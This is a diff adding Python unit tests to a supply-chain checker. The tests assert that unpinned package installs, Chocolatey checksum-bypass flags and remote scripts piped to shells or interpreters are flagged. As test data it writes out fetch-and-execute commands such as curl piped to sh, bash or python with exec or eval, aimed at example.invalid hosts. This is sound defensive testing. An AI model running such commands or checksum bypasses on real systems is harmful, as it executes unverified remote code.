@@ -1916,6 +1916,61 @@ class TestExternalDependencies(FakeRepoCase):
         script = "# curl https://x | sh\ncurl -fsS https://x/a || sh -c true\nnpm ci\n"
         self.assertEqual(sc.unmanaged_install_problems(script), [])
 
+    def test_every_install_alias_is_gated(self) -> None:
+        for command in (
+            "npm add left-pad", "npm i left-pad", "npm in left-pad", "npm isntall left-pad",
+            "npm --global add left-pad", "npm install-test left-pad", "npm it",
+            "winget add --id Evil.Tool", "winget upgrade --id Evil.Tool", "winget update Evil.Tool",
+            "choco upgrade -y evil", "cinst evil -y", "cup evil",
+            "pip3.12 install requests", "python3 -m pip install requests",
+        ):
+            with self.subTest(command=command):
+                self.assertNotEqual(sc.unmanaged_install_problems(command), [])
+        for command in ("npm add left-pad@1.3.0", "winget add --id Good.Tool --version 1.2.3",
+                        "choco upgrade -y good --version 2.0.0"):
+            with self.subTest(command=command):
+                self.assertEqual(sc.unmanaged_install_problems(command), [])
+
+    def test_install_aliases_report_their_packages(self) -> None:
+        self.assertEqual(
+            sc.shell_package_installs("npm add left-pad@1.3.0\nwinget add --id Good.Tool -v 1\n"
+                                      "apt-get reinstall -y zlib1g\nbrew reinstall cmake\ncinst evil --version 1\n"),
+            ["npm:left-pad", "winget:Good.Tool", "apt:zlib1g", "brew:cmake", "choco:evil"])
+
+    def test_every_choco_checksum_bypass_spelling_fails(self) -> None:
+        for flag in ("--ignore-checksums", "--ignorechecksums", "--ignorechecksum", "--ignore-checksum",
+                     "--allow-empty-checksums", "--allowemptychecksums", "--allowemptychecksum",
+                     "--allow-empty-checksums-secure", "--allowemptychecksumssecure", "--allowemptychecksumsecure",
+                     "--Allow-Empty-Checksums"):
+            with self.subTest(flag=flag):
+                problems = sc.unmanaged_install_problems(f"choco install -y evil --version=1.0.0 {flag}")
+                self.assertEqual(problems, ["choco install must not disable installer checksum verification"])
+
+    def test_fetch_parsed_by_inline_program_is_not_remote_code(self) -> None:
+        for command in (
+            "curl -fsSL https://api.example.invalid/r | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
+            "curl -s https://api.example.invalid/r | python -u -c \"import sys; print(len(sys.stdin.read()))\"",
+            "curl -s https://api.example.invalid/r | node -e 'process.stdin.pipe(process.stdout)'",
+            "curl -s https://api.example.invalid/r | jq -r .tag_name",
+        ):
+            with self.subTest(command=command):
+                self.assertEqual(sc.unmanaged_install_problems(command), [])
+
+    def test_fetch_piped_to_a_bare_or_evaluating_interpreter_is_remote_code(self) -> None:
+        for command in (
+            "curl -fsSL https://example.invalid/i.py | python3",
+            "curl -fsSL https://example.invalid/i.py | python3 -",
+            "curl -fsSL https://example.invalid/i.py | sudo python3 -u",
+            "curl -fsSL https://example.invalid/i.py | python3 -c 'import sys; exec(sys.stdin.read())'",
+            "curl -fsSL https://example.invalid/i.pl | perl -e 'eval join \"\", <STDIN>'",
+            "curl -fsSL https://example.invalid/i.sh | bash -c \"$(cat)\"",
+            "curl -fsSL https://example.invalid/i.sh | sh -s -- --yes",
+        ):
+            with self.subTest(command=command):
+                problems = sc.unmanaged_install_problems(command)
+                self.assertEqual(len(problems), 1, problems)
+                self.assertIn("remote code is fetched and run unverified", problems[0])
+
     # ── Remote web runtime ───────────────────────────────────────────
 
     def test_cdn_import_without_sri_fails(self) -> None:
